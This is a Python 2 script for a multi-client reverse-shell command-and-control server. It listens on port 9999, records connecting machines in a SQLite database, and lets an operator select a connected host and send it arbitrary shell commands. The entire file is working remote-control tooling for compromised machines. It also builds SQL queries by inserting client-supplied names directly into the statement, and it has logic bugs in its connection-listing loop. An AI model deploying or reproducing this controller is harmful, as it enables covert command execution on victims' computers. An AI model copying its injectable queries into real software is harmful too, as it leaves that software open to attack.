import socket
import threading
import datetime
import sqlite3
import cmd
import sys

db = sqlite3.connect(r'C:\Users\Administrator\Desktop\Raspi\mysite\newdb.db')
cursor = db.cursor()
cursor.execute('CREATE TABLE IF NOT EXISTS connhistory(hostid INTEGER PRIMARY KEY , ip TEXT NOT NULL, name TEXT NOT NULL, status TEXT NOT NULL, start_time TEXT NOT NULL, end_time TEXT NOT NULL)')
db.commit()

all_addresses = []
all_connections = []
all_names = []


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print "Socket creation error: " + str(msg)


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        #print "Binding socket to port: " + str(port)
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print "Socket binding error: " + str(msg) + "\n" + "Retrying..."
        socket_bind()
        s.close()


# Accept connections from multiple clients and save to list
def accept_connections():
    db = sqlite3.connect(r'C:\Users\Administrator\Desktop\Raspi\mysite\newdb.db')
    cursor = db.cursor()
    for c in all_connections:
        c.close()
    
    del all_addresses[:]
    del all_connections[:]
    del all_names[:]
    
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            name = str.decode(conn.recv(4096))
            all_names.append(name)
            print '\nConnection has been established: ' + str(address[0])
            cursor.execute('INSERT INTO connhistory(ip, name, status, start_time, end_time) VALUES("{0}", "{1}", "{2}", "{3}", "{4}");'.format(str(address[0]), name, 'Active', str(datetime.datetime.now()), '-'))
            db.commit()
        except Exception as e:
            print e
            print 'Error accepting connection'


# Interactive prompt for sending commands remotely
def shell():
    while True:
        cmd = raw_input('Shell>')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn:
                send_target_commands(conn)
        else:
            print 'Command not recognized'


# Displays all current connections
def list_connections():
    
    db = sqlite3.connect(r'C:\Users\Administrator\Desktop\Raspi\mysite\newdb.db')
    cursor = db.cursor()
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(4096)
        except:
            cursor.execute('UPDATE connhistory SET status = "{0}", end_time = "{1}" WHERE ip = "{2}";'.format('InActive', str(datetime.datetime.now()), all_addresses[i][0]))
            cursor.execute('')
            db.commit()
            del all_connections[i]
            del all_addresses[i]
            del all_names[i]
            continue
        results += str(i + 1) + '\t' + str(all_addresses[i][0]) + '\t' + str(all_names[i]) + '\n'
        cursor.execute('SELECT * FROM connhistory')
        data = cursor.fetchall()
        db.commit()
        cursor.close()
        db.close()
        print '------- Clients -------\n' + results


# Select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target) - 1
        conn = all_connections[target]
        conn.send(str.encode(' '))
        x = str.decode(conn.recv(4096))
        if str(all_names[target]) in x:
        	print 'You are now connected to: ' + str(all_names[target]) + '[' + str(all_addresses[target][0]) + ']'
        print x,
        return conn
    except:
        print 'Not a valid selection'
        return None

# Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = raw_input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(4096)).encode("utf-8")
                print client_response,
        except:
            print 'Connection was lost'
            break

def conns():
    socket_create()
    socket_bind()
    accept_connections()
    
    
def main():
    t1 = threading.Thread(target=conns)
    t1.daemon = True
    t1.start()
    shell() 
    
main()

